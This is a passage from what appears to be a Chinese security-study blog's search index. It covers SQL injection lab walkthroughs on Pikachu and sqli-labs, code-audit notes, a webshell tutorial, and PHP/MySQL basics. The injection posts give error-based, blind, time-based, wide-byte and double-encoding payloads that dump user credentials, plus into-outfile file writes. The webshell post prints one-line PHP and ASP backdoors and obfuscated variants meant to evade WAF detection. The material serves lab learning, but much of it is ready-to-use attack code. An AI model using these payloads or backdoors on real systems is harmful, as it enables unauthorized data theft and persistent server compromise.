0,1),0x7e),1,32))#\n\n\n5.delete注入删除留言进行抓包，发现了id为get传参方式可能是注入点加单引号尝试是否会报错\n\n出现报错说明这是一个注入点\n\n尝试使用报错注入\n尝试构建pyload\nand extractvalue(1,concat(0x7e,(select database())))\n\n成功爆出数据库\n\n继续构建pyload 爆出表名\nand extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))\n\n\n爆出列名\nand extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))\n\n\n查询用户名和密码\nand extractvalue(1,concat(0x7e,substr((select group_concat(concat(username)) from users),1,31)))\n\n\nand extractvalue(1,concat(0x7e,substr((select group_concat(concat(password)) from users),1,31)))\n\n\n6.基于boolian的盲注单引号测试是否有注入点，\nkobe ‘ and 1=1\n查看数据库的长度，构建pyload\nkobe&#x27; and length(database())=7 #\n\n\n数据库长度为7\n判断字符内容\nkobe&#x27; and ascii(substr((database()),1,1))=112 #\t\t\t//p\n\n\n依次判断\n数据库为pikachu\n7.基于时间的盲注单引号判断是否存在注入页面返回正常\nkobe’ and sleep(5)测试是否有注入点\n利用if函数判断当前数据库长度\nkobe&#x27;and if(length(database())=7,sleep(5),0)#\n\n通过页面返回时间判断截取字符的ascii码\nkobe&#x27; and if(ascii(substr((select database()),1,1)=112),sleep(5),0)#  //p\n\nkobe&#x27; and if(ascii(substr((select database()),2,1)=105),sleep(5),0)#  //i\n\nkobe&#x27; and if(ascii(substr((select database()),3,1)=107),sleep(5),0)#  //k\n\nkobe&#x27; and if(ascii(substr((select database()),4,1)=97),sleep(5),0)#  //a\n\nkobe&#x27; and if(ascii(substr((select database()),5,1)=99),sleep(5),0)#  //c\n\nkobe&#x27; and if(ascii(substr((select database()),6,1)=104),sleep(5),0)#  //h\n\nkobe&#x27; and if(ascii(substr((select database()),7,1)=117),sleep(5),0)#  //u\n\n8.宽字节注入原理当数据带入时被反斜杠转义\n构造语句\n%81&#x27; or 1=1 #\n\n因为是post传参使用burp抓包发送\n\n产生回显\n%81&#x27; union select 1,2 #\n\n\n爆出数据库\n%81&#x27; union select 1,database() #\n\n\n表名\n%81&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#\n\n\n字段名\n%81&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1))#\n\n查询账号密码\n%81&#x27; union select username,password from users #\n\n","categories":["渗透测试"],"tags":["渗透测试"]},{"title":"代码审计","url":"http://example.com/2022/02/03/代码审计/","content":"login登录文件存在sql注入漏洞(error/blind)\n报错注入payload\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\n\n可使用万能密码登录\nor 1=1 #\n\nindex.php入口文件将传入的id/author查询留言板内容，将留言内容输入到前端\nconfig.php 数据库连接文件\nheader.php 前端header文件\nHyperDown.php 公共类文件\nfooter.php 前端footer文件\nadd.php发布消息文件存在sql注入漏洞(error/blind)\n报错注入payload\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\n\ndel.php删除消息存在sql注入漏洞(error/blind)\n报错注入payload\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\n\nupload.php 上传文件文件名注入漏洞(https://www.cnblogs.com/conquer-vv/p/11328249.html)\n&#x27;+(select database())+&#x27;.jpeg\n\n文件上传漏洞\n\n\nlogout.php 注销会话reg.php 注册存在sql注入漏洞(error/blind)\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\n\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"留言板代码审计","url":"http://example.com/2022/01/28/留言板代码审计/","content":"用户端index.php入口文件传入id/author查询留言板内容并将留言的内容输出到前端\nconnect.php 连接数据库文件\nliuyan1.php  写入数据库文件\n存在注入漏洞，利用报错注入\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\t\n\nlogin.php登录文件存在sql注入漏洞(联合注入)\nunion select 1,2,3 #\n\n存在万能密码登录漏洞\nor 1=1 #\n\nlogin1.php注册文件存在注入漏洞(报错注入)\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\t\n\nlogout.php退出登录文件管理员后台login.php登录文件connet.php 登录连接数据文件\n存在sql注入(联合注入)\nunion select 1,2,3 #\n\n存在万能密码登录\nor 1=1 #\n\nindex.php管理用户留言存在任意文件上传漏洞\nactio.php修改数据库留言文件\n存在sql注入漏洞(联合注入)\nunion select 1,2,3 #\n\nuser.php管理用户账号文件adminuser.php修改数据库文件\n存在sql注入(联合注入)\nunion select 1,2,3 #\n\nlogout.php退出登录\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"SQL注入","url":"http://example.com/2022/01/18/SQL注入/","content":"前言关于所有的注入都基于php代码运行mysql语句时没有对特殊的符号进行过滤而产生\n经典的mysql运行命令\n$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;  //查询数据库中id的的数据\n\n\n\n一:union联合注入二：报错注入靶场环境;sqli\n报错注入首先要知道一个正确的值或id才能进行报错注入。通过extractvalue(arg1,arg2)函数来构建payload\nextractvalue函数最大显示为32位\n适用数据库5.1.5版本以上\n1.判断是否存在注入点和注入类型输入id=1页面回显正常\n\n加单引号测试注入点和注入类型\n返回错误通过返回的错误判定是字符型注入\n\nphp运行的代码如下\n$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;\t\t//单引号是字符型注入\n\n构建函数语句进行注入爆出当前数据库\n&#x27;and extractvalue(1,concat(0x7e,(database())))#\t\t\t\t//#需要进行url编码为%23 //0x7e 为16进制字符  x代表16进制  \n\n\n也可以通过information_schema数据库查询出所有的数据库\nsubstr(str,开始位置,长度)可将所有的数据查看出来\n\n&#x27;and extractvalue(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32))) #\n\n\n开始逐步添加查询表类似于联合查询的步骤\n三：布尔盲注靶场环境;sqli\n报错注入首先要知道一个正确的值或id才能进行报错注入\n添加单引号页面返回不正常，\n字符型注入，单引号闭合\n\n页面错误但不回显任何信息\n使用布尔盲注构建payload\n&#x27;and length(database())&gt;8 #\t\t//当数据库长度大于8时页面回显错误\n\n\n&#x27;and length(database())=8 #\t\t//当数据库长度等于8时页面回显正常 说明数据库的字符长度位8\n\n\n逐个破解数据库的8个字符\n使用ascii进行破解\n取数据库的第一个字符\n&#x27; and ascii（substr((database()),1,1))=115 #\t\t\n\n\n随后依次进行判断后面的字符\n通过页面返回的与正常来判断\n查看数据库中第一个表的第一个字符\n&#x27; and ascii((substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;100  #\n\n依次判断所有表的名字\n四：时间盲注靶场环境;sqli\n时间盲注也需要知道一个正确的值或id才能进行报错注入\n1.判断是否存在注入点&#x27; and sleep(5)#\t\t\t\t//如果存在注入则页面会在五秒后返回数据\n\n2.利用if函数来判断数据库的长度&#x27; and if(length(database())=8,sleep(5),0)#    //页面回显时间延长5秒 错误会立即回显\n\n3.判断数据库的名称&#x27;and if((ascii(substr(database(),1,1))=115),sleep(5),0)#\n\n\n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"SQL注入原理和手工注入流程","url":"http://example.com/2022/01/16/SQL注入原理和手工注入流程/","content":"一：sql注入一：sql注入分类1.根据请求方式分类GET方式请求注入\nPOST方式请求注入\n2.根据注入点参数分类整数型注入\n字符型注入\n搜索型注入\n3.根据sql注入点反馈类型分类union类型\n基础错误显示\n布尔类型\n基于时间\n其他类型\n4.根据web应用的数据库类型分类今天主要讲解整数注入和字符型注入\nmysql     sqlserver     oracle        access\n二：sql注入万能密码1.常见的万能密码asp/aspx代码\n&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.aor 1=1--&#x27;or 1=1--\n\nphp代码\nadmin&#x27; #         &#x27;or 1=1 #&quot;or &quot;a&quot;=&quot;a    \n\n2.使用原理通过mysql数据库的命令来实现的\n当输入账号和密码后通过select * from 命令来查询user表中是否有输入的账号密码，如果有就会返回登录成功\n没有就会返回登录失败\n正好常的php源码\nselect * from user where username= &#x27;admin&#x27; and password= &#x27;123456&#x27;   \n\n将万能密码放入用户名输入框代码会变为\n输入的账号为空则值为假,但是1=1恒为真，or的意思是当一个为真那么另一个也为真 ，跟一个“#”号是注释符\n在mysql执行的命令会变为select * from user(查询user表中的所有信息)。有返回信息则成功\nselect * from user where username= &#x27;&#x27;or 1=1 # and password= &#x27;123456&#x27;  \n\n三：sql注入联合查询1.判断是否有注入点和注入类型单引号判断是否有注入点，如果页面返回错误，则可能存在 Sql 注入。\n 原因是无论字符型还是整型都会因为单引号个数不匹配而报错\n如下字符型代码\n$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;\n\n当$id=1’时则代码会返回\n$sql=&quot;SELECT * FROM users WHERE id=&#x27;1’&#x27; LIMIT 0,1&quot;;\n\n数字型代码如下\n$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;\n\n当$id=1’时则代码会返回\n$sql=&quot;SELECT * FROM users WHERE id=1&#x27; LIMIT 0,1&quot;;\n\n如何区分是字符型和数字型\n数字型测试方法；\nand 1=1 最经典的测试方法\n当是数字形式执行代码如下\n$sql=&quot;SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1&quot;;\n\n页面正常运行\nand 1=2 时代码运行如下\n$sql=&quot;SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1&quot;;\n\n1=2不成立运行错误\n可判断该类型为数字型\n同理如果将and 1=1 带入到字符型中就会出现如下情况\n代码运行如下\n$sql=&quot;SELECT * FROM users WHERE id=‘1 and 1=1’ LIMIT 0,1&quot;;\n\n不会产生逻辑判断所以不管是and 1=1 或and 1=2都会显示正常，所以也可以根据这种情况来进行判断\n字符型测试方法；\nand ‘1’=’1来进行判断\n后台运行代码为\n$sql=&quot;SELECT * FROM users WHERE id=‘1 and ’1’=‘1’ LIMIT 0,1&quot;;\n\n则页面运行正常\nand ‘1’=’2 时代码执行如下\n$sql=&quot;SELECT * FROM users WHERE id=‘1 and ’1’=‘2’ LIMIT 0,1&quot;;\n\n1=2不成立运行错误\n可判断该类型为字符型\n通过靶场来测\n输入单引号后出现报错\n\n报错信息\n&#x27;1&#x27;&#x27; LIMIT 0,1\n\n判断该类型为字符型注入\n\n2.判断字段数利用order by 来判断字段数\n\n从1递曾测试，当输入4时出现回显报错，说明字段数为3\n\n3.联合查询利用union select 联合查询数据库中的数据\n利用mysql数据库命令select database()命令查询当前所在的数据库\n&#x27;union select 1,2,3 %23   //%23 为#\n\n\n\n利用mysql自带库information_schema查询security数据库的表名，information_schema数据库为mysql5.7以上版本带有的默认数据库。\n0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1%23\n\n\n1.table_name字段保存着数据库中所有的表的信息.\n2.来自数据库information_schema中的tables表\n3.位置在table_schema字段下的security的数据库\n4.通过limit命令依次输出表\n利用mysql自带库information_schema查询security数据库中users表中的字段\n1.column_name字段中存有所有数据库的字段\n2.来自数据库information_schema中的columns的表\n\n&#x27; union select 1,column_name,3 frominformation_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1%23\n\n\n查询username,password的值 ，来自sencurity数据库中的users表\n&#x27; union select 1,username,password from security.users limit 1,1%23\n\n\n\n到这一步就完成了(get)字符型的注入\n补充常用函数\nConcat()    //：将多个字符串链接成一个字符串Concat_ws()和concat()一样   //：将多个字符串链接成一个字符串，但可以指定分隔符Group_concat()\t\t//：将多行结果连接成一组\n\n四：报错注入extractvalue()函数extractvalue(1,2)\t\t\t\t//接受两个参数\n\npayload构建&#x27;and extractvalue(1,concat(0x7e,database()))#\n\n\nupdatexml()函数updatexml(1,2,3)\t\t\t\t\t//接受三个参数\n\npayload构建&#x27; and updatexml(1,concat(0x7e,database()),3)#\n\n\n五：布尔盲注substr()函数substr(1,2,3)   \t\t//截取数据库某一列字段中的一部分\n\n\nlength()函数length(database())\t\t\t//获取当前数据库名的长度\n\n\nascii()函数ascii(length(database()))\t\t\t//将数据库名的长度转为ascii码\n\n\n构建payload&#x27; and length(database())&gt;7 #             //判断数据库名的长度 查询的值为真\n\n&#x27;and ascii(substr(database()，0，1))&gt;115\t\t\t//判断数据库名的第一个字母\n\n五：时间盲注sleep()函数sleep(5)\t\t\t\t//延时5秒响应\n\n\nif()函数if(1,2,3)\t\t\t\t\t\t//三个参数进行条件判断\n\n\n构建payload&#x27; and sleep(5)#\t\t\t\t//查看是否有注入点，带入的参数为真\n\n&#x27; and if(length(database())&gt;7,sleep(5),0)\t\t//如果数据库名的长度大于7，则延迟5秒响应\n\n&#x27; and if(ascii(substr(database(),0,1))&gt;115,sleep(5),0)\t\t//判断数据库名的第一个字母\n\n六：宽字节注入原理\n\n构建payload%81 - %fe\t\t\t\t\t\t\t\t//之间的数都可以进行利用\n\n%81&#x27; and 1=1 #\n\n七：二次编码注入原理\n构建payload\n%2527\t\t\t\t//单引号url两次编码后的值\n\n%2527 and 1=1 %23\t\t\t\n\n后续通过联合注入的方式进行注入\npayload构造的每个语句的单引号都要通过二次编码才能生效\n二：sql注入读写文件payload构建&#x27; union select 1,2,load_file(&#x27;/var/www/1.txt&#x27;)\t\t//读取文件\n\n&#x27; union select 1,2,&#x27;&lt;?php phpinfo() ?&gt;&#x27; into outfile &#x27;/var/www/html&#x27;\t//写入文件\n\n&#x27; union select 1,2,&#x27;&lt;?php phpinfo() ?&gt;&#x27; into dumpfile &#x27;/var/www/html&#x27;\t//写入文件\n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"webshell应用及变形免杀","url":"http://example.com/2022/01/13/webshell应用及变形/","content":"一：webshell介绍1.什么是webshell？1.webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门\n2.由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具\n3.攻击者可以利用webshell从而达到长期控制网站服务器的目的，并获得执行操作权\n2.分类1.大马\n•大马体积大，一般在50k以上\n•隐蔽性差\n•功能多，一般都包括提权功能，磁盘管理，数据库连接\n2.小马\n•体积小，隐蔽性强\n•能与图片结合在一起上传\n•可以利用解析漏洞来运行\n•功能少，一般只有上传功能\n3.一句话木马\n•代码简短，通常只有一行代码\n•使用灵活，可以作为单独的文件也可以插入正常文件\n•变形非常多\n3.一句话WebShell的执行原理4.常见的代码执行函数1.PHP中常见的代码执行函数eval()函数&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;\t\t\t\t//@符使这行代码不会出现报错 cmd为接收参数\n\nassert()函数该函数在mysql数据库7.0版本就不再使用了\n&lt;?php @assert($_REQUEST[&#x27;cmd&#x27;])?&gt;\n\npreg_replace()函数•preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使preg_replace() 将replacement 参数当作PHP 码\n•5.5版本/e修饰符被弃用；7.0版本不再支持/e修饰符\n&lt;?php @perg_replace(&quot;/abc/e&quot;,$_REQUSET[&#x27;cmd&#x27;],&quot;abcd&quot;)?&gt;    \n\ncreate_function()函数create_function主要是用来创建匿名函数\n如果没有严格对参数传递进行过滤，攻击者可以构造字符串传递给create_function()执行任意命令\n&lt;?php    $func = creat_function(&quot;,$_REQUSET[&#x27;cmd&#x27;]&quot;);\t$func();?&gt;\n\narray_map()函数•array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有的组\n•回调函数接受参数数目应该和传递给array_map() 函数的数组数一致\n&lt;?php    //?func=system&amp;cmd=ipconfig\t$func=$_REQUEST[&#x27;func&#x27;];\t$cmd=$_REQUEST[&#x27;cmd&#x27;];\t$array[0]=$cmd;\t$new_array=array_map($func,$array);?&gt;\n\narray_filter()函数•array_filter( array $array [, callable $callback [,int $flag = 0 ]] ) : array\n•依次将array 数组中的每个值传递到callback 函数。如果callback 函数返回true，则array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变\n&lt;?php    //?func=system&amp;cmd=whoami    $cmd=$_REQUEST[&#x27;cmd&#x27;];\t$array1=array($cmd);\t$func=$_REQUEST[&#x27;func&#x27;];\tarray_filter($array1,$func);?&gt;\n\n2.asp语言的WebShell&lt;%evalrequest(&quot;777&quot;)%&gt;&lt;%executerequest(&quot;777&quot;)%&gt;&lt;%execute(request(&quot;777&quot;))%&gt;&lt;%executeGlobalrequest(&quot;777&quot;)%&gt;&lt;%eval(Request(chr(35)))%&gt; \n\n二：webshell变形免杀1.变形的目的waf通常以关键字判断是否为一句话木马，但是一句话木马的变形有很多。\n都是为了绕过waf.\n2.常见的变形方法1.str_replace()函数在第三个参数中，查找第一个参数，并替换成第二个参数，这里就相当于删除abc\n&lt;?php    $a = str_replace(&quot;bac&quot;,&quot;&quot;,&quot;eabcvabcaabceabcl&quot;);\t\t//$a = eval\t$a($_REQUSET[&#x27;cmd&#x27;]);?&gt;\n\n2.base64_decode()函数&lt;?php    $a=base64_decode(&quot;YXNzZXJ0&quot;);\t\t//$a = assert\t$a($_REQUEST[&#x27;cmd&#x27;]);?&gt;\n\n3.利用”.”操作符在PHP中，字符串之间连接使用的是“点”来实现的，可以把两个或两个以上的字符串连接成一个字符串\n&lt;php    $a=&quot;as&quot;.&quot;se&quot;;\t$b=&quot;r&quot;.&quot;t&quot;;\t$c=$a.$b;\t$c($_REQUEST[&#x27;cmd&#x27;]);?&gt;\n\n4.更换数据来源&lt;?php    $_REQUEST[a]($_REQUEST[cmd]); //利用方法：a=assert&amp;cmd=phpinfo();?&gt;&lt;?\t\t\t           php@assert($_REQUEST[$_REQUEST[b]]);  //利用方法：b=cmd&amp;cmd=phpinfo();?&gt;\n\n5.替代标签通过改变php的标签特征来绕过waf进而达到免杀的效果\n&lt;script language=&quot;php&quot;&gt;    @assert($_REQUEST[&#x27;cmd&#x27;])&lt;/script&gt;\n\n6.字符串组合隐藏关键字将需要隐藏的字符随机打乱，首先定义一些随机字符串，再调用打乱后的字符顺序并拼接成有效的参数\n&lt;?php    $str = &#x27;abcsqebrt&#x27;;\t$a =$str[0].$str[3].$str[3].$str[5].$str[7].$str[8];\t@$a($_REQUEST[&#x27;cmd&#x27;]);?&gt;\n\n7.使用对象，类，内置函数实现免杀&lt;?php    class magic&#123;    \tpublic $xw = null;    \tpublic $xl = null;    \tfunction __construct()&#123;            $this-&gt;xw = &#x27;rinv($_CBFG[n]);&#x27;;\t\t//凯撒加密方法            $this-&gt;xl = str_rot13($this-&gt;xw);     //凯撒解密函数str_rot13偏移13位            @eval($this-&gt;xl);        &#125;&#125;new magic();?&gt;\n\n","categories":["web安全"],"tags":["webshell"]},{"title":"Mysql数据库","url":"http://example.com/2022/01/08/Mysql数据库/","content":"一：Mysql数据库详解1.登录命令使用-h参数时连接方式为:TCP/IP\n如果没有 -h 参数，默认会使用 UNIX socket 方式\nmysql-hhost_name-u user_name–ppassword\n\n2.Mysql程序常用命令show databases \t\t//显示所有数据库use dbname\t\t\t//选择默认的数据库show tables    \t\t//显示默认数据库中所有表\\c\t\t\t\t\t//放弃正在输入的命令\\h\t\t\t\t\t//显示命令清单\\q\t\t\t\t\t//退出mysql程序\\s\t\t\t\t\t//查看mysql服务器的状态    \n\n3.数据类型种类\n\n\n\n\n4.常用sql语句1.创建数据库/删除数据库create database name   \t\t\t//创建数据库drop database name \t\t\t\t//删除数据库    \n\n2.建立/删除/查看表操作create table liuyan(id int auto_increment primary key,title varchar(255),content text)//创建数据表并指定字段auto_increment             //自增primary key  \t\t\t\t//主键 默认不能为空drop table name\t\t\t\t//删除表\n\n3.更改表结构的操作alter table name rename as name\t\t\t\t//修改liuyan为liuyanbanalter table name add time time\t\t\t\t//(first/after 字段名)默认最后alter table name add primary key (time)\t\t//定义字段为主键alter table name modify time text\t\t\t\t//修改数据类型alter table name change time user varchar(255)\t\t//修改字段名及数据类型alter table name drop time\t\t\t\t\t\t\t//删除字段\n\n\n\n4.插入数据操作insert into 表名(colname1,colname2) values(&#x27;value1&#x27;,&#x27;value2&#x27;) //插入单行数据insert into 表名(title,content) values(&#x27;title test1&#x27;,&#x27;content test1&#x27;),(&#x27;title test1&#x27;,&#x27;content test1&#x27;)\t\t\t\t//插入多行数据\n\n\n\n5.更新数据update tbname set cloname=&#x27;value&#x27; where id=1;\n\n\n6.删除数据delete from liuyan where id =1;\n\n\n二：PHP操作Mysql1.PHP访问MySQL数据库的流程\n\n\n2.数据库相关函数介绍\n\n\n\n\n三：PHP文件包含1.概念\n2.相关函数\n\n\n\n\n","categories":["Mysql数据库"],"tags":["web安全"]},{"title":"php基础（三）","url":"http://example.com/2022/01/06/php基础（三）/","content":"一：表单处理1.表单的概述\n2.表单属性\n3.实例前端html代码&lt;html&gt;&lt;body&gt;&lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;username:&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;password:&lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n后端php代码&lt;?php$username = $_POST[&#x27;username&#x27;];$pass = $_POST[&#x27;password&#x27;];echo &quot;username is &quot;.$username;echo &quot;&lt;/br&gt;&quot;;echo &quot;password is &quot;.$pass;?&gt;\n\n4.表单的属性\n5.服务器端接收数据\n\n二：PHP文件处理1.表单处理过程通过句柄来确定从哪里开始读取文件\n&lt;?php$name = &quot;1.txt&quot;;\t\t\t\t\t//定义文件名字$file = fopen($name,&#x27;r&#x27;)\t\t\t//用读的权限打开文件，并获取句柄echo fread($file,filesize($name));\t\t//读取整个文件fclose($file);\t\t\t\t\t\t//关闭文件?&gt;\n\n2..fopen()函数$file = fopen($name,&#x27;r&#x27;)\t\t\t//用读的权限打开文件，并获取句柄\n\n\n3.fread()函数\nfread($file,filesize($name));\t\t//读取整个文件\n\n4.fgets()函数读取文本文件中的一行\n&lt;?php$file = fopen(&#x27;1.txt&#x27;,&#x27;r&#x27;);while(!feof($file))&#123;\t\t\t\t//判断指针是否已经到达文件末尾，没有到文件末尾就循环读取文件echo fgets($file).&quot;&lt;hr&gt;&quot;;\t\t\t//读取一行文本&#125;fclose($file);?&gt;\n\n5.fgetss() 函数读取文件中的一行字符，并去掉所有HTML和PHP标记\n&lt;?php$file = fopen(&#x27;1.txt&#x27;,&#x27;r&#x27;);while(!feof($file))&#123;\t\t\t\t//判断指针是否已经到达文件末尾，没有到文件末尾就循环读取文件echo fgetss($file).&quot;&lt;hr&gt;&quot;;\t\t\t//读取一行文本,并去掉所有HTML和PHP标记&#125;fclose($file);?&gt;\n\n6.fgetc() 函数读取文件中的一个字符\n&lt;?php$file = fopen(&#x27;1.txt&#x27;,&#x27;r&#x27;);while(!feof($file))&#123;\t\t\t\t//判断指针是否已经到达文件末尾，没有到文件末尾就循环读取文件echo fgetc($file).&quot;&lt;hr&gt;&quot;;\t\t\t//读取文件中的一个字符&#125;fclose($file);?&gt;\n\n7.file_get_contents() 函数无须经过打开文件及关闭文件操作就可读取文件中的全部内容 ，\n&lt;?phpecho file_get_contents(1.txt);\t\t\t//读取文件的全部内容?&gt;\n\n\n8.file_put_contents()函数以追加的方式将内容写进文件中\n&lt;?php$file = &#x27;log.txt&#x27;;\t\t\t //要写入文件的文件名，如果文件不存在，将会创建一个log.txt$content = &quot;helleworld&quot;;if(file_put_contents($file, $content,FILE_APPEND))&#123;echo &quot;success&lt;br /&gt;&quot;;&#125;echo file_get_contents($file);?&gt;\n\n9.fwrite() 函数以将一个字符串写入到文本文件中\n&lt;?php$file = &#x27;log.txt’;$handle = fopen($file, &#x27;w&#x27;) $data = &#x27;This is the data&#x27;;fwrite($handle, $data);fclose($handle);?&gt;\n\n\n10.file()函数把文件读入到一个数组中\n&lt;?phpprint_r(file(&quot;test.txt&quot;));?&gt; \n\n输出\nArray([0] =&gt; Hello World. Testing testing![1] =&gt; Another day, another line.[2] =&gt; If the array picks up this line,[3] =&gt; then is it a pickup line?)\n\n11.复制、移动和删除文件&lt;?phpif(copy(&#x27;test.txt&#x27;,&#x27;./data/bak.txt&#x27;)) //复制文件echo &#x27;文件复制成功&#x27;;else echo &#x27;文件复制失败&#x27;;unlink(&#x27;./test.txt&#x27;); //删除文件?&gt;\n\n\n12.获取文件属性\n\n13.目录的基本操作\n","categories":["php代码基础"],"tags":["php代码基础"]},{"title":"php基础（二）","url":"http://example.com/2022/01/05/php基础（二）/","content":"一：String 函数1.addcslashes() 函数addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。\n预定义字符是：\n\n单引号（’）\n双引号（”）\n反斜杠（\\）\nNULL\n\n提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备合适的字符串。\n注释：默认情况下，PHP 指令 magic_quotes_gpc 为 on，对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。\n语法addcslashes(string); \t\t\t// string规定要转义的字符串    \n\n实例1定义转义的字符&lt;?php$sum = &quot;Hell&#x27;o World&quot;;echo addcslashes($sum)?&gt;    \n\n2.bin2hex() 函数bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去\n语法bin2hex(string)\t\t\t\t//  string规定要转换的字符串\n\n实例&lt;?php$str = bin2hex(&quot;Hello World!&quot;);echo($str);?&gt;\n\n3.hex2bin()函数hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。\n实例&lt;?phpecho hex2bin(&quot;48656c6c6f20576f726c6421&quot;);?&gt;\n\n输出Hello World!\n\n4.chr() 函数chr() 函数从指定 ASCII 值返回字符。\nASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，十六进制值被定义为带前置 0x。\n语法chr(ascii)\t\t\t\t\t//ascii ASCII值\n\n实例使用八进制值 046 来添加 ASCII 字符：&amp;。\n&lt;?php$str = chr(046);           \t\t\t//&#x27;0&#x27;指定为8进制 46 = &amp;echo(&quot;You $str me forever!&quot;);?&gt;\n\n5.explode() 函数explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。\n注释：“separator” 参数不能是一个空字符串。\n注释：该函数是二进制安全的。\n语法explode(separator,string,limit)\t\t\t//separator 规定在哪里分割字符串  string 要分割的字符串     //limit规定所返回的数组元素的数目\n\n实例&lt;?php$str = &#x27;one,two,three,four&#x27;; //  返回包含一个元素的数组print_r(explode(&#x27;,&#x27;,$str,0));print &quot;&lt;br&gt;&quot;; // 数组元素为 2print_r(explode(&#x27;,&#x27;,$str,2));print &quot;&lt;br&gt;&quot;; // 删除最后一个数组元素print_r(explode(&#x27;,&#x27;,$str,-1));?&gt;\n\n6.md5() 函数md5() 函数计算字符串的 MD5 散列。\nmd5() 函数不能处理数组，数组都返回 null，md5(a[]) 结果为 null。\n实例&lt;?php$str = &quot;Hello&quot;;echo md5($str);\t\t\t//将字符串加密?&gt;\n\n7.md5_file() 函数md5_file() 函数计算文件的 MD5 散列。。\n实例&lt;?php$filename = &quot;test.txt&quot;;$md5file = md5_file($filename);echo $md5file;\t\t\t//将文件加密?&gt;&lt;?php$md5file = md5_file(&quot;test.txt&quot;);\t\t//在文件中存储 &quot;test.txt&quot; 的 MD5 散列file_put_contents(&quot;md5file.txt&quot;,$md5file);?&gt; &lt;?php$md5file = file_get_contents(&quot;md5file.txt&quot;);\t//检测 &quot;test.txt&quot; 是否已被更改（即 MD5 散列是否已被更改）if (md5_file(&quot;test.txt&quot;) == $md5file)&#123;echo &quot;The file is ok.&quot;;&#125;else&#123;echo &quot;The file has been changed.&quot;;&#125;?&gt;    \n\n8.str_split() 函数str_split() 函数把字符串分割到数组中。\n&lt;?phpprint_r(str_split(&quot;Hello&quot;,3));//从第三位之后将字符串分割到数组中?&gt;\n\n输出Array ( [0] =&gt; Hel [1] =&gt; lo )\n\n9.str_replace() 函数str_replace() 函数替换字符串中的一些字符（区分大小写）。\n实例&lt;?phpecho str_replace(&quot;World&quot;,&quot;pata&quot;,&quot;Hello World&quot;);?&gt;\n\n输出Hello pata\n\n10.str_ireplace()函数str_ireplace() 函数替换字符串中的一些字符（不区分大小写）\n实例&lt;?phpecho str_ireplace(&quot;WORLD&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);?&gt;\n\n输出Hello Pata\n\n11.strcmp()函数strcmp() 函数比较两个字符串。\n注释：strcmp() 函数是二进制安全的，且区分大小写。\n提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。\n实例&lt;?phpecho strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;); // the two strings are equalecho strcmp(&quot;Hello world!&quot;,&quot;Hello&quot;); // string1 is greater than string2echo strcmp(&quot;Hello world!&quot;,&quot;Hello world! Hello!&quot;); // string1 is less than string2?&gt;\n\n输出0\t\t\t\t//值为0则两个字符串相等7\t\t\t\t// &gt;0则string1 大于 string2-7\t\t\t\t// &lt;00则string1 小于 string2\n\n12.srlen()函数strlen() 函数返回字符串的长度，中文字符串的处理使用 mb_strlen() 函数\n实例&lt;?phpecho strlen(&quot;Hello&quot;);\t\t\t//返回字符串的长度?&gt;\n\n13.substr()函数substr() 函数返回字符串的一部分。\n注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。\n实例&lt;?phpecho substr(&quot;Hello world&quot;,10).&quot;&lt;br&gt;&quot;;\t\t//输出 decho substr(&quot;Hello world&quot;,1).&quot;&lt;br&gt;&quot;;\t\t// ello worldecho substr(&quot;Hello 